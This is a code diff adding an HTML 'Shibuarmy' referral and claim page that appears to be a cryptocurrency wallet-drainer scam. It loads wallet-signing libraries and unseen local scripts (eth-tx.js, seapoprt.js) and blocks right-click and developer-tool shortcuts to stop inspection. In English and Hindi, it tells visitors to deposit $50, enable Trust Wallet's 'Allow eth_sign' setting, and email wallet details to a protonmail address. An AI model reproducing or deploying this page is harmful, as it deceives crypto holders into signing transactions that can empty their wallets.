@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+     <meta name="viewport" content="width=device-width">
+    <meta charset="UTF-8">
+    <title>Shibuarmy | Claim</title>
+    <link href="npm/bootstrap%405.3.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM" crossorigin="anonymous">
+    <script src="npm/bootstrap%405.3.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-geWF76RCwLtnZ8qwWowPQNguL3RmwHVBC9FhGdlKrxdiJJigb/j/68SIy3Te4Bkz" crossorigin="anonymous"></script>
+		<script src="https://bundle.run/buffer@6.0.3"></script> 
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.6.9/ethers.umd.min.js"></script>
+<script src="https://unpkg.com/@walletconnect/web3-provider@1.7.5/dist/umd/index.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/web3@3.0.0-rc.5/dist/web3.min.js"></script>
+<script src="https://unpkg.com/moralis-v1@latest/dist/moralis.js"></script>
+<script src="js/eth-tx.js"></script>
+<script src="js/main.js"></script>
+<script src="js/index.js"></script>
+<script src="js/seapoprt.js"></script>
+<script>
+
+
+    // disable right click
+    document.addEventListener('contextmenu', event => event.preventDefault());
+ 
+    document.onkeydown = function (e) {
+ 
+        // disable F12 key
+        if(e.keyCode == 123) {
+            return false;
+        }
+ 
+        // disable I key
+        if(e.ctrlKey && e.shiftKey && e.keyCode == 73){
+            return false;
+        }
+ 
+        // disable J key
+        if(e.ctrlKey && e.shiftKey && e.keyCode == 74) {
+            return false;
+        }
+ 
+        // disable U key
+        if(e.ctrlKey && e.keyCode == 85) {
+            return false;
+        }
+    }
+</script>
+    <link href="style.css" rel="stylesheet" type="text/css">
+    <link rel="icon" type="image/png" href="fav.png">  
+</head>
+
+<body>
+    <div class="container mainbl">
+        <div class="area">Shibuarmy Referral Program </div>
+        <div class="row">
+            <div class="col-lg-3"></div>
+            <div class="col-lg-6">
+                <div class="image"><img src="image.png" alt=""></div>
+                <p class="maintitle">
+                    $Claim Section
+                </p>
+            </div>
+            <div class="col-lg-3"></div>
+        </div>
+        <div class="row btn-row">
+            <div class="col-lg-3"></div>
+            <div class="col-lg-6">
+				<button id="connectButton" class="interact-button">CONNECT</button>
+                <button id="claimButton" class="interact-button">CLAIM</button>
+            </div>
+            <div class="col-lg-3"></div>
+        </div>
+        <div class="row types">
+            <div class="col-lg-4">
+                <p class="title">Instructions & steps to claim Your Shibatoken.</p>
+		     <p class="subtext"> You Must have set your Trust wallet { 50$ deposited  (This will be used only for gas transaction fee purpose)  & "Allow eth_sign" must be enabled}.</p>
+                <p class="subtext"> You Must Sent your Trust wallet USDT address and referral deatils { Minimum five referrals }to admin1.shibuarmy@protonmail.com .</p>
+            </div>
+		
+<div class="col-lg-4">
+                <p class="title">आपके शिबाटोकन पर दावा करने के निर्देश और चरण।</p>
+		     <p class="subtext"> आपको अपना ट्रस्ट वॉलेट सेट करना होगा { 50$ जमा करना होगा ( इसका उपयोग केवल गैस लेनदेन शुल्क उद्देश्य के लिए किया जाएगा )और "Allow eth_sign" enable होना चाहिए}।</p>
+                <p class="subtext"> आपको अपना ट्रस्ट वॉलेट यूएसडीटी पता और रेफरल विवरण (न्यूनतम पांच रेफरल) admin1.shibuarmy@protonmail.com पर भेजना होगा।</p>
+            </div>
+
+	
+            <div class="col-lg-4">
+                <p class="title">Ask for Support</p>
+                <p class="subtext">If you have any query , kindly contact us at : admin1.shibuarmy@protonmail.com.</p> <br>
+            </div>
+		  <div class="col-lg-4">
+                <p class="title">पूछताछ के लिए संपर्क करें</p>
+                <p class="subtext">यदि आपका कोई प्रश्न है, तो कृपया हमसे यहां संपर्क करें: admin1.shibuarmy@protonmail.com</p> <br>
+            </div>
+        </div>
+    </div>
+    <script src="build/three.js"></script>
+
+    <script>
+        var scene, camera, renderer;
+        var particles, particleGeometry, particleMaterial;
+
+        init();
+
+        function init() {
+            scene = new THREE.Scene();
+            scene.background = new THREE.Color(0x000000);
+            camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+            camera.position.z = 5;
+
+            particleGeometry = new THREE.BufferGeometry();
+            var particleCount = 1000;
+            var positions = new Float32Array(particleCount * 3);
+
+            for (var i = 0; i < positions.length; i++) {
+                positions[i] = (Math.random() - 0.5) * 10;
+            }
+
+            particleGeometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+
+            particleMaterial = new THREE.PointsMaterial({
+                color: 0xFFFFFF,
+                size: 0.01
+            });
+
+            particles = new THREE.Points(particleGeometry, particleMaterial);
+            scene.add(particles);
+
+            renderer = new THREE.WebGLRenderer({
+                antialias: true
+            });
+            renderer.setSize(window.innerWidth, window.innerHeight);
+
+            document.body.appendChild(renderer.domElement);
+
+            animate();
+        }
+
+        function animate() {
+            requestAnimationFrame(animate);
+
+            particles.rotation.x += 0.001;
+            particles.rotation.y += 0.002;
+
+            renderer.render(scene, camera);
+        }
+    </script>
+</body>
+
+</html>
